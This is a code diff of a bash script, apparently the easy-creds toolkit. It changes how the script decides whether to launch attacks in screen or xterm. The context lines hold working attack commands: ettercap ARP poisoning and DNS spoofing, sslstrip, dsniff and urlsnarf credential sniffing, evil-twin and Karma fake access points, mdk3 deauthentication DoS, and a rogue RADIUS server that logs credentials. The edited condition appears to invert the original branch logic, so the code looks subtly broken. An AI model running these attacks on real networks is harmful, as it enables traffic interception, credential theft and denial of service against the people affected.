@@ -58,7 +58,7 @@ fi
 # Uncomment the following line to launch attacks in a screen session instead of an xterm window.
 #unset isxrunning
 
-if [ -z ${isxrunning} ]; then
+if [ $isxrunning -eq 1 ]; then
 	echo -e "\n\e[1;31m[-]\e[0m Your attack will be launched in screen\n"
 	sleep 2
 fi
@@ -175,7 +175,7 @@ else
 	sleep 3
 	f_prereqs
 fi
-if [ -z ${isxrunning} ];then
+if [ $isxrunning -eq 1 ];then
 	nano ${dhcp_tunnel_add}
 else
  	xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano ${dhcp_tunnel_add} &
@@ -195,7 +195,7 @@ else
 	sleep 3
 	f_prereqs
 fi
-if [ -z ${isxrunning} ];then
+if [ $isxrunning -eq 1 ];then
 	nano ${etter_conf_path}
 else
 	xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano ${etter_conf_path} &
@@ -217,7 +217,7 @@ else
 	sleep 3
 	f_prereqs
 fi
-if [ -z ${isxrunning} ];then
+if [ $isxrunning -eq 1 ];then
 	nano ${etter_dns_path}
 else
 	xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano ${etter_dns_path} &
@@ -330,7 +330,7 @@ echo -e "\n\e[1;34m[*]\e[0m Your victim host list is at /tmp/victims."
 echo -e "\e[1;31m[-]\e[0m Remember to remove any IPs that should not be poisoned! (HSRP Physical NICs)\n" 
 read -p "Would you like to edit the victim host list? [y/N] : " yn
 if [ $(echo ${yn} | tr 'A-Z' 'a-z') == "y" ]; then
-	if [ -z ${isxrunning} ];then
+	if [ $isxrunning -eq 1 ];then
 		nano /tmp/victims
 	else
 		xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Victims List" -e nano /tmp/victims &
@@ -471,7 +471,7 @@ case ${etterlaunch} in
 	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
 	esac
 
-	if [ ! -z ${isxrunning} ]; then
+	if [ ! $isxrunning -eq 1 ]; then
 	   xterm -geometry "${width}"x${height}-${x}+${y} -T "Ettercap - $type" -l -lf ${logfldr}/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ${c} &
 	else
 	   screen -S easy-creds -X screen -t "Ettercap-$type" ${c}
@@ -665,11 +665,11 @@ f_dhcptunnel(){
 	# airbase-ng is going to create our fake AP with the SSID we specified
 	echo -e "\e[1;34m[*]\e[0m Launching Airbase with your settings."
 
-	if [ "${eviltwin}" == "1" ] && [ -z ${isxrunning} ]; then
+	if [ "${eviltwin}" == "1" ] && [ $isxrunning -eq 1 ]; then
 	  screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e "${ESSID}" -v ${MONMODE}
-	elif [ "${eviltwin}" == "1" ] && [ ! -z ${isxrunning} ]; then
+	elif [ "${eviltwin}" == "1" ] && [ ! $isxrunning -eq 1 ]; then
 	  xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "${ESSID}" -v ${MONMODE} &
-	elif [ -z ${isxrunning} ]; then
+	elif [ $isxrunning -eq 1 ]; then
 	  screen -dmS easy-creds -t Airbasg-NG airbase-ng -e "${ESSID}" -c "${CHAN}" ${MONMODE}
 	else
 	  xterm -geometry ${width}x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -e "${ESSID}" -c "${CHAN}" ${MONMODE} &
@@ -694,7 +694,7 @@ f_dhcptunnel(){
 	sleep 2
 
 	echo -e "\e[1;34m[*]\e[0m Launching Tail."
-	if [ -z ${isxrunning} ]; then
+	if [ $isxrunning -eq 1 ]; then
 	 screen -S easy-creds -X screen -t DMESG tail -f /var/log/messages
 	else
 	 y=$((${y}+${yoffset}))
@@ -727,9 +727,9 @@ fi
 if [ "${etterlaunch}" -lt "8" ];then
 	echo -e "\e[1;34m[*]\e[0m Launching SSLStrip..."
 	sslstripfilename=sslstrip$(date +%F-%H%M).log
-	if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
+	if [ "${wireless}" == "1" ] && [ $isxrunning -eq 1 ]; then
 		screen -S easy-creds -X screen -t sslstrip sslstrip -pfk -w ${logfldr}/${sslstripfilename}
-	elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
+	elif [ -z ${wireless} ] && [ $isxrunning -eq 1 ]; then
 		screen -dmS easy-creds -t sslstrip sslstrip -pfk -w ${logfldr}/${sslstripfilename}
 	elif [ "$offset" == "1" ]; then
 		y=$((${y}+${yoffset}))
@@ -749,7 +749,7 @@ echo -e "\e[1;34m[*]\e[0m Configuring IP forwarding..."
 echo "1" > /proc/sys/net/ipv4/ip_forward
 sleep 3
 echo -e "\e[1;34m[*]\e[0m Launching URLSnarf..."
-if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
+if [ "${wireless}" == "1" ] && [ $isxrunning -eq 1 ]; then
 	screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${TUNIFACE}
 	screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
 	screen -S easy-creds -p urlsnarf -X log
@@ -757,7 +757,7 @@ elif [ "${wireless}" == "1" ]; then
 	y=$((${y}+${yoffset}))
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "URL Snarf" -l -lf ${logfldr}/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i ${TUNIFACE} &
 	sleep 3
-elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
+elif [ -z ${wireless} ] && [ $isxrunning -eq 1 ]; then
 	screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${IFACE}
 	screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
 	screen -S easy-creds -p urlsnarf -X log
@@ -767,13 +767,13 @@ else
 	sleep 3
 fi
 echo -e "\e[1;34m[*]\e[0m Launching Dsniff..."
-if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
+if [ "${wireless}" == "1" ] && [ $isxrunning -eq 1 ]; then
 	screen -S easy-creds -X screen -t dsniff dsniff -m -i ${TUNIFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log
 elif [ "$wireless" == "1" ]; then
 	y=$((${y}+${yoffset}))
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "Dsniff" -bg blue -fg white -e dsniff -m -i ${TUNIFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log &
 	sleep 3
-elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
+elif [ -z ${wireless} ] && [ $isxrunning -eq 1 ]; then
 	screen -S easy-creds -X screen -t dsniff dsniff -m -i ${IFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log
 else
 	y=$((${y}+${yoffset}))
@@ -825,7 +825,7 @@ f_mdk3aps(){
 
 	 echo -e "\n\e[1;34m[*]\e[0m Please standby while we DoS the AP with BSSID Address $dosmac..."
 	 sleep 3
-		if [ -z $isxrunning ]; then
+		if [ $isxrunning -eq 1 ]; then
 			screen -S easy-creds -X screen -t MDK3-DoS mdk3 ${dosmon} d -b /tmp/ec/ec-dosap
 		else
 			xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
@@ -865,7 +865,7 @@ f_lastman(){
 	echo -e "\n\e[1;34m[*]\e[0m Press ctrl-c to stop the attack..."
 	sleep 3
 
-	if [ -z ${isxrunning} ]; then
+	if [ $isxrunning -eq 1 ]; then
 		screen -S easy-creds -X screen -t Last-Man-Standing mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null)
 	else
 		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null) &
@@ -897,7 +897,7 @@ f_getbssids(){
 
 	echo -e "\n\e[1;34m[*]\e[0m Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m"
 
-	if [ -z ${isxrunning} ]; then
+	if [ $isxrunning -eq 1 ]; then
 		screen -S easy-creds -X screen -t Airodump airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv
 	else
 		xterm -geometry 90x25+0+0 -T "Airodump" -e airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv &
@@ -936,7 +936,7 @@ f_getbssids(){
 	airmon-ng start ${airowlan} &> /dev/null
 	sleep 3
 
-	if [ -z ${isxrunning} ]; then
+	if [ $isxrunning -eq 1 ]; then
 		echo -e "\e[1;34m[*]\e[0m ctrl-c the screen terminal to stop the attack"
 		sleep 5
 		screen -S easy-creds -X screen -t MDK3-AP-DoS mdk3 ${airomon} d -b /tmp/ec/ec-dosap;(airmon-ng stop ${airomon} >/dev/null)
@@ -1050,7 +1050,7 @@ EOF
 f_karmafinal(){
 echo -e "\e[1;34m[*]\e[0m Launching Airbase..."
 # airbase-ng is going to create our fake AP with the SSID default
-if [ -z ${isxrunning} ]; then
+if [ $isxrunning -eq 1 ]; then
 	screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e default -v ${MONMODE}
 else
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "default" -v ${MONMODE} &
@@ -1079,7 +1079,7 @@ sleep 3
 iptables -t nat -A PREROUTING -i ${TUNIFACE} -j REDIRECT
 
 echo -e "\e[1;34m[*]\e[0m Launching Tail..."
-if [ -z ${isxrunning} ]; then
+if [ $isxrunning -eq 1 ]; then
 	screen -S easy-creds -t DMESG -X screen tail -f /var/log/messages
 else
 	y=$((${y}+${yoffset}))
@@ -1102,7 +1102,7 @@ else
 fi
 sleep 3
 
-if [ -z ${isxrunning} ]; then
+if [ $isxrunning -eq 1 ]; then
 	echo -e "\e[1;34m[*]\e[0m Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\n"
 	sleep 5
 	screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/ec/karma.rc
@@ -1233,7 +1233,7 @@ EOF
 ##################################################
 f_freeradiusfinal(){
 echo -e "\n\e[1;34m[*]\e[0m Launching the FreeRadius server...\n"
-if [ ! -z ${isxrunning} ]; then
+if [ ! $isxrunning -eq 1 ]; then
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "Radius Server" -bg white -fg black -e radiusd -X -f &
 	echo $! > /tmp/ec/freeradius.pid
 	sleep 3
@@ -1245,7 +1245,7 @@ fi
 echo -e "\n\e[1;34m[*]\e[0m Launching hostapd...\n"
 sleep 3
 
-if [ ! -z ${isxrunning} ]; then
+if [ ! $isxrunning -eq 1 ]; then
 	y=$((${y}+${yoffset}))
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "hostapd" -bg black -fg white -e hostapd /tmp/ec/ec-hostapd.conf &
 	sleep 3
@@ -1261,7 +1261,7 @@ fi
 echo -e "\n\e[1;34m[*]\e[0m Launching credential log file...\n"
 sleep 3
 
-if [ ! -z ${isxrunning} ]; then
+if [ ! $isxrunning -eq 1 ]; then
 	y=$((${y}+${yoffset}))
 	xterm -geometry "${width}"x${height}-${x}+${y} -T "credentials" -bg black -fg green -hold -l -lf ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt -e tail -f ${freeradiuslog} &
 	sleep 3
@@ -1323,9 +1323,9 @@ while [ ${i} -le "${NUMLINES}" ]; do
 	i=$[${i}+1]
 done
 
-if [ -s ${PWD}/strip-accts.txt ] && [ -z ${isxrunning} ]; then
+if [ -s ${PWD}/strip-accts.txt ] && [ $isxrunning -eq 1 ]; then
 	cat ${PWD}/strip-accts.txt | less
-elif [ -s ${PWD}/strip-accts.txt ] && [ ! -z ${isxrunning} ]; then
+elif [ -s ${PWD}/strip-accts.txt ] && [ ! $isxrunning -eq 1 ]; then
 	xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat ${PWD}/strip-accts.txt &
 else
 	echo -e "\n\e[1;31m[-]\e[0m Sorry no credentials captured..."
@@ -1349,7 +1349,7 @@ f_dsniff(){
 	done
 
 	dsniff -r ${DSNIFFPATH} >> ${PWD}/dsniff-log.txt
-	if [ -z ${isxrunning} ];then
+	if [ $isxrunning -eq 1 ];then
 	 cat ${PWD}/dnsiff-log.txt | less
 	else
 	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat ${PWD}/dsniff-log.txt &
@@ -1371,7 +1371,7 @@ unset ETTERECI
 while [ -z ${ETTERECI} ] || [ ! -f "${ETTERECI}" ]; do read -e -p "Enter the full path to your ettercap.eci log file: " ETTERECI; done
 
 etterlog -p "${ETTERECI}" >> ${PWD}/etterlog.txt
-if [ -z ${isxrunning} ]; then
+if [ $isxrunning -eq 1 ]; then
 	cat ${PWD}/etterlog.txt | less
 else
 	xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat ${PWD}/etterlog.txt &
